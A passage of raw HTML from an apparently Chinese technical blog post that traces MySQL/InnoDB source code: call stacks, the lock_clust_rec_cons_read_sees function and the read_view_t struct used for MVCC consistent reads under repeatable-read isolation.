data-line=\"crayon-5bab670167e56472539565-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e56472539565-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e56472539565-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e56472539565-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e56472539565-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e56472539565-1\"><span class=\"crayon-e\">handle_one_connection  </span><span class=\"crayon-i\">MySQL</span>的网络模型是<span class=\"crayon-e\">one </span><span class=\"crayon-e\">request </span><span class=\"crayon-e\">one </span><span class=\"crayon-v\">thread</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e56472539565-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">do_handle_one_connection</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e56472539565-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">do_command</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e56472539565-4\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">dispatch_command</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e56472539565-5\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">mysql</span><span class=\"crayon-sy\">_</span>parse<span class=\"crayon-h\">\t</span>解析<span class=\"crayon-v\">SQL</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e56472539565-6\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">mysql_execute_command</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e56472539565-7\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">execute_sqlcom</span><span class=\"crayon-sy\">_</span>select<span class=\"crayon-h\">\t</span>执行<span class=\"crayon-i\">select</span>语句</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e56472539565-8\"><span class=\"crayon-h\">\t\t\t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">handle</span><span class=\"crayon-sy\">_</span>select</div><div class=\"crayon-line\" id=\"crayon-5bab670167e56472539565-9\"><span class=\"crayon-h\">\t\t\t\t\t\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span>一堆<span class=\"crayon-e\">parse </span><span class=\"crayon-i\">join</span><span class=\"crayon-h\"> </span>等的操作，当前并不关心</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e56472539565-10\"><span class=\"crayon-h\">\t\t\t\t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">tab</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">read_record</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">read</span><span class=\"crayon-sy\">_</span>record<span class=\"crayon-h\"> </span>读取记录</div><div class=\"crayon-line\" id=\"crayon-5bab670167e56472539565-11\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>由于mysql默认隔离级别是repeatable_read(RR),所以read_record重载为 rr_sequential(当前我们并不关心select通过index扫描出row之后再通过condition过滤的过程)。继续追踪:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e60419792180\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nread_record\r\n |-rr_sequential\r\n\t|-ha_rnd_next\r\n\t\t|-ha_innobase::rnd_next 这边就已经到了innodb引擎了\r\n\t\t\t|-general_fetch\r\n\t\t\t\t|-row_search_for_mysql\r\n\t\t\t\t\t|-lock_clust_rec_cons_read_sees 这边就是判断并选择版本的地方\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e60419792180-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e60419792180-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e60419792180-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e60419792180-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e60419792180-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e60419792180-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e60419792180-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e60419792180-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e60419792180-1\"><span class=\"crayon-v\">read_record</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e60419792180-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rr_sequential</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e60419792180-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ha_rnd_next</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e60419792180-4\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ha_innobase</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">rnd</span><span class=\"crayon-sy\">_</span>next<span class=\"crayon-h\"> </span>这边就已经到了<span class=\"crayon-i\">innodb</span>引擎了</div><div class=\"crayon-line\" id=\"crayon-5bab670167e60419792180-5\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">general_fetch</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e60419792180-6\"><span class=\"crayon-h\">\t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">row_search_for_mysql</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e60419792180-7\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">lock_clust_rec_cons_read</span><span class=\"crayon-sy\">_</span>sees<span class=\"crayon-h\"> </span>这边就是判断并选择版本的地方</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e60419792180-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>让我们看下该函数内部:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e64905052215\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbool lock_clust_rec_cons_read_sees(const rec_t* rec /*由innodb扫描出来的一行*/,....){\r\n\t...\r\n\t// 从当前扫描的行中获取其最后修改的版本trx_id(事务id)\r\n\ttrx_id = row_get_rec_trx_id(rec, index, offsets);\r\n\t// 通过参数(一致性快照视图和事务id)决定看到的行快照\r\n\treturn(read_view_sees_trx_id(view, trx_id));\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e64905052215-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e64905052215-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e64905052215-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e64905052215-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e64905052215-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e64905052215-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e64905052215-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e64905052215-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e64905052215-1\"><span class=\"crayon-t\">bool</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lock_clust_rec_cons_read_sees</span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">rec_t*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rec</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">/*由innodb扫描出来的一行*/</span><span class=\"crayon-sy\">,</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e64905052215-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e64905052215-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 从当前扫描的行中获取其最后修改的版本trx_id(事务id)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e64905052215-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">trx_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">row_get_rec_trx_id</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">rec</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e64905052215-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 通过参数(一致性快照视图和事务id)决定看到的行快照</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e64905052215-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">read_view_sees_trx_id</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">view</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">trx_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e64905052215-7\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e64905052215-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p></p>\n<h3>read_view的创建过程</h3>\n<p>我们先关注一致性视图的创建过程,我们先看下read_view结构:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e67075489336\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstruct read_view_t{\r\n\t// 由于是逆序排列，所以low/up有所颠倒\r\n\t// 能看到当前行版本的高水位标识,&gt; low_limit_id皆不能看见\r\n\ttrx_id_t\tlow_limit_id;\r\n\t// 能看到当前行版本的低水位标识,&lt; up_limit_id皆能看见\r\n\ttrx_id_t\tup_limit_id;\r\n\t// 当前活跃事务(即未提交的事务)的数量\r\n\tulint\t\tn_trx_ids;\r\n\t// 以逆序排列的当前获取活跃事务id的数组\r\n\t// 其up_limit_id&lt;tx_id&lt;low_limit_id\r\n\ttrx_id_t*\ttrx_ids;\t\r\n\t// 创建当前视图的事务id\r\n\ttrx_id_t\tcreator_trx_id;\r\n\t// 事务系统中的一致性视图链表\r\n\tUT_LIST_NODE_T(read_view_t) view_list;\r\n};</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e67075489336-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e67075489336-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e67075489336-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e67075489336-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e67075489336-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e67075489336-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e67075489336-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e67075489336-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e67075489336-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e67075489336-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e67075489336-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e67075489336-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e67075489336-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e67075489336-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e67075489336-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e67075489336-16\">16</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e67075489336-1\"><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">read_view_t</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e67075489336-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 由于是逆序排列，所以low/up有所颠倒</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e67075489336-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 能看到当前行版本的高水位标识,&gt; low_limit_id皆不能看见</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e67075489336-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">trx_id_t\t</span><span class=\"crayon-v\">low_limit_id</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e67075489336-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 能看到当前行版本的低水位标识,&lt; up_limit_id皆能看见</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e67075489336-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">trx_id_t\t</span><span class=\"crayon-v\">up_limit_id</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e67075489336-7\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 当前活跃事务(即未提交的事务)的数量</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e67075489336-8\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">ulint\t\t</span><span class=\"crayon-v\">n_trx_ids</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e67075489336-9\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 以逆序排列的当前获取活跃事务id的数组</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e67075489336-10\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 其up_limit_id&lt;tx_id&lt;low_limit_id</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e67075489336-11\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e \">trx_id_t*</span><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">trx_ids</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e67075489336-12\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 创建当前视图的事务id</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e67075489336-13\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">trx_id_t\t</span><span class=\"crayon-v\">creator_trx_id</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e67075489336-14\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 事务系统中的一致性视图链表</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e67075489336-15\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">UT_LIST_NODE_T</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">read_view_t</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">view_list</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e67075489336-16\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>然后通过debug，发现创建read_view结构也是在上述的rr_sequential中操作的，继续跟踪调用栈:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e6b937395411\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nrr_sequential\r\n |-ha_rnd_next\r\n \t|-rnd_next\r\n \t\t|-index_first 在start_of_scan为true时候走当前分支index_first\r\n \t\t\t|-index_read\r\n \t\t\t\t|-row_search_for_mysql\r\n \t\t\t\t\t|-trx_assign_read_view\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e6b937395411-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e6b937395411-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e6b937395411-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e6b937395411-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e6b937395411-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e6b937395411-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e6b937395411-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e6b937395411-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e6b937395411-1\"><span class=\"crayon-v\">rr_sequential</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e6b937395411-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ha_rnd_next</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e6b937395411-3\"><span class=\"crayon-h\"> \t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rnd_next</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e6b937395411-4\"><span class=\"crayon-h\"> \t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">_</span>first<span class=\"crayon-h\"> </span>在<span class=\"crayon-v\">start_of</span><span class=\"crayon-sy\">_</span>scan为<span class=\"crayon-t\">true</span>时候走当前分支<span class=\"crayon-v\">index_first</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e6b937395411-5\"><span class=\"crayon-h\"> \t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">index_read</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e6b937395411-6\"><span class=\"crayon-h\"> \t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">row_search_for_mysql</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e6b937395411-7\"><span class=\"crayon-h\"> \t\t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">trx_assign_read</span><span class=\"crayon-sy\">_</span>view</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e6b937395411-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>我们看下row_search_for_mysql里的一个分支:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e6e531070532\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco 